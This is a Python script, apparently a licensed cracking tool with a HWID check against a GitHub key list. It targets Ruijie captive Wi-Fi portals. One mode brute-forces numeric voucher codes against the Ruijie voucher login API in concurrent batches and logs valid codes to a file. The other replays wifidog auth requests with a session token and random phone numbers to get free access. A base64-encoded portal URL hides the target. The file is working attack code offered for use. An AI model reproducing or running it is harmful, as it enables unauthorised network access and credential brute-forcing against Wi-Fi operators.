import os
import re
import sys
import uuid
import zlib
import json
import time
import ping3
import base64
import random
import string
import asyncio
import aiohttp
import hashlib
import argparse
import requests
from datetime import datetime

# --- UI & COLORS ---
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def Line():
    try:
        cols = os.get_terminal_size()[0]
    except:
        cols = 40
    print(f"{y}-" * cols + f"{w}")

def Logo():
    clear()
    logo = f"""{r}  __  __  ____  ______     ____  _ 
 |  \/  |/ __ \|  ____|   |  _ \| |
 | \  / | |  | | |__      | |_) | |
 | |\/| | |  | |  __|     |  _ <| |
 | |  | | |__| | |____    | |_) |_|
 |_|  |_|\____/|______|   |____/(_)
                                   
{g}              Created by MOEYU [V2]{w}"""
    print(logo)
    Line()
    print(f"{w}[♠️] Created by Moe Yu")
    print(f"{w}[♣️] Telegram: @starlink112")
    print(f"{w}[♦️] Status: Licensed Mode")
    Line()

# --- SECURITY SYSTEM (FIXED HWID & EXPIRY) ---
def get_hwid():
    """စက်ရဲ့ Fixed ID ကို ထုတ်ပေးသည့် Function (တစ်ခါ run တိုင်း မပြောင်းပါ)"""
    try:
        # စက်ရဲ့ အချက်အလက်အချို့ကို ပေါင်းပြီး MD5 Hash လုပ်ခြင်း
        platform_info = sys.platform + str(os.cpu_count())
        node = str(uuid.getnode())
        combined = (platform_info + node).encode()
        return hashlib.md5(combined).hexdigest()[:12].upper()
    except:
        return "UNKNOWN-ID"

def check_license():
    Logo()
    my_hwid = get_hwid()
    key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
    
    print(f"{b}[*] Your HWID: {y}{my_hwid}{w}")
    print(f"{b}[*] Checking license from server...{w}")
    
    try:
        # Github မှ data ကို ရယူခြင်း (Cache မမိအောင် random parameter ထည့်ထားသည်)
        response = requests.get(key_url + f"?v={random.randint(1,9999)}", timeout=10)
        if response.status_code != 200:
            print(f"{r}[!] Connection Error (Status: {response.status_code})")
            sys.exit()
            
        data = response.text.splitlines()
        found = False
        
        for line in data:
            if "|" in line:
                db_hwid, exp_date = line.split("|")
                if db_hwid.strip() == my_hwid:
                    found = True
                    # နေ့စွဲစစ်ခြင်း
                    expiry = datetime.strptime(exp_date.strip(), "%Y-%m-%d")
                    if datetime.now() < expiry:
                        print(f"{g}[+] Access Granted! Expires: {exp_date}{w}")
                        time.sleep(2)
                        return True
                    else:
                        print(f"{r}[!] Your license expired on {exp_date}.{w}")
                        sys.exit()
        
        if not found:
            print(f"{r}[!] HWID Not Registered! Please send your HWID to Admin.{w}")
            sys.exit()
            
    except Exception as e:
        print(f"{r}[!] Error: {str(e)}{w}")
        sys.exit()

# --- CORE FEATURES ---
async def get_session_id(session, session_url, previous_session_id):
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
    except:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        # Base64 decoded URL
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def send_request(self, session, session_id):
        params = {'token': session_id, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
        try:
            async with session.post(f'http://192.168.0.1:2060/wifidog/auth?', params=params) as response:
                ping_status = await asyncio.to_thread(ping3.ping, 'google.com')
                ping_ms = int(ping_status*1000) if ping_status else '??'
                print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {g}{response.status}{w} | Ping: {g}{ping_ms}{w}ms")
        except: pass

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession() as session:
            session_id = await get_session_id(session, self.session_url, None)
            while True:
                await self.send_request(session, session_id)
                await asyncio.sleep(1)

class VoucherCode:
    def __init__(self, length=6, speed=50):
        self.length = length
        self.speed = speed
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def login_voucher(self, session, session_id, voucher):
        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
        try:
            async with session.post(url, json=data) as req:
                res = await req.text()
                if 'logonUrl' in res:
                    print(f'\n{g}[SUCCESS] {voucher}{w}')
                    with open("success.txt", "a") as f: f.write(voucher + "\n")
                else:
                    print(f'{w}[*] Testing: {y}{voucher}{w}', end='\r')
        except: pass

    async def execute(self):
        Logo()
        connector = aiohttp.TCPConnector(limit=self.speed)
        async with aiohttp.ClientSession(connector=connector) as session:
            session_id = await get_session_id(session, self.session_url, None)
            while True:
                tasks = []
                for _ in range(50): # batch size
                    v = "".join(random.choice(string.digits) for _ in range(self.length))
                    tasks.append(self.login_voucher(session, session_id, v))
                await asyncio.gather(*tasks)

# --- START UP ---
def main():
    check_license() # ပထမဆုံး စစ်မည်
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["code", "internet"], required=True)
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=50)
    args = parser.parse_args()

    try:
        if args.option == "internet":
            asyncio.run(InternetAccess().execute())
        elif args.option == "code":
            vobj = VoucherCode(length=args.length, speed=args.speed)
            asyncio.run(vobj.execute())
    except KeyboardInterrupt:
        print(f"\n{y}[!] Stopped by user.{w}")

if __name__ == "__main__":
    main()
